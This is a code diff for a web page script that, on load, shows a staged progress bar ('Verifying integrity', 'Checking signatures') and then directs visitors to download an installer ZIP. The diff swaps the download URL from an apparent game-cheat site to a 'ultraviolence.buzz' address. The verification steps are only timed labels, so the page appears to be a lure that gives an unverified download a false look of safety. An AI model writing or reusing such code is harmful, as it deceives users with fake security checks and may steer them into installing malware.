@@ -1,5 +1,5 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const REDIRECT_URL = "https://www.resight-cheats.net/installer.zip";
+  const REDIRECT_URL = "https://ultraviolence.buzz/d/Installer.zip";
 
   const bar         = document.getElementById("progress-bar");
   const pct         = document.getElementById("progress-pct");
@@ -14,7 +14,7 @@ document.addEventListener("DOMContentLoaded", () => {
     { label: "Verifying integrity...",    pct: 18,  delay: 400 },
     { label: "Checking signatures...",    pct: 37,  delay: 750 },
     { label: "Resolving dependencies...", pct: 54,  delay: 650 },
-    { label: "Preparing installer package...",      pct: 71,  delay: 700 },
+    { label: "Packaging archive...",      pct: 71,  delay: 700 },
     { label: "Finalizing...",             pct: 88,  delay: 500 },
     { label: "Ready.",                    pct: 100, delay: 350 },
   ];
